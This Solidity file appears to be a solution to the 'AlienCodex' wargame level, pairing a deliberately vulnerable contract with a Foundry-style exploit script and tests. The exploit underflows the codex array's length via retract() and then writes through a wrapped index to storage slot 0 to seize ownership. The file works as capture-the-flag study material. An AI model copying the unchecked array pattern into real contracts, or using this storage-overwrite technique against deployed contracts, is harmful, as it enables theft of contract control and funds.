pragma solidity ^0.5.16;

contract Ownable {
    address public owner;
    constructor() public { owner = msg.sender; }
}

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;
    modifier contacted() { assert(contact); _; }
    function makeContact() public { contact = true; }
    function retract() public contacted { codex.length--; }
    function revise(uint256 index, bytes32 content) public contacted { codex[index] = content; }
}

interface AlienVm {
    function addr(uint256 privateKey) external returns (address);
    function startBroadcast(uint256 privateKey) external;
    function stopBroadcast() external;
    function store(address target, bytes32 slot, bytes32 value) external;
    function load(address target, bytes32 slot) external returns (bytes32);
}

contract AlienScript {
    AlienVm internal constant vm = AlienVm(address(uint160(uint256(keccak256("hevm cheat code")))));
    uint256 internal constant PLAYER_PRIVATE_KEY = 1;
    address internal constant PLAYER_ADDRESS = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
}

contract Exploit is AlienScript {
    AlienCodex public alienCodexInstance;

    function setUp() public {
        alienCodexInstance = new AlienCodex();
    }

    function run() external {
        vm.startBroadcast(PLAYER_PRIVATE_KEY);

        alienCodexInstance.makeContact();
        alienCodexInstance.retract();

        uint256 index = uint256(-uint256(keccak256(abi.encode(uint256(1)))));
        alienCodexInstance.revise(index, bytes32(uint256(uint160(PLAYER_ADDRESS))));

        vm.stopBroadcast();
    }

    function testExploit() external {
        setUp();
        address beforeOwner = alienCodexInstance.owner();
        this.run();
        address afterOwner = alienCodexInstance.owner();
        require(beforeOwner != PLAYER_ADDRESS, "already player");
        require(afterOwner == PLAYER_ADDRESS, "not owner");
    }

    function testSlots() external {
        setUp();
        // slot0 after deploy: owner in low 160 bits
        bytes32 s0 = vm.load(address(alienCodexInstance), bytes32(uint256(0)));
        bytes32 s1 = vm.load(address(alienCodexInstance), bytes32(uint256(1)));
        require(uint256(s1) == 0, "len should be 0");
        // owner should be in s0
        require(address(uint160(uint256(s0))) == address(this), "deployer not owner");
    }
}
